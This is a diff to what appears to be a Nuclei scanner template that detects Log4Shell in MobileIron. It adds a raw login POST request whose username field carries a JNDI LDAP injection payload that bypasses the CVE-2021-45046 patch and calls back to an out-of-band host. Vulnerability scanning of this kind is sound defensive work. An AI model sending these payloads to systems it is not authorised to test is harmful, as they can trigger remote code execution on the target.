@@ -11,6 +11,7 @@ info:
     - https://github.com/rwincey/CVE-2021-44228-Log4j-Payloads/blob/main/MobileIron
   tags: rce,jndi,oast,log4j,mobileiron
 
+#add CVE-2021-45046
 requests:
   - raw:
       - |
@@ -21,6 +22,15 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         j_username=${jndi:ldap://{{Host}}.{{interactsh-url}}}&j_password=password&logincontext=employee
+        
+      - |
+        POST /mifs/j_spring_security_check HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36
+        Referer: {{RootURL}}/mifs/user/login.jsp
+        Content-Type: application/x-www-form-urlencoded
+
+        j_username=${jndi:ldap://127.0.0.1#{{Host}}.{{interactsh-url}}}&j_password=password&logincontext=employee
 
     matchers-condition: and
     matchers:
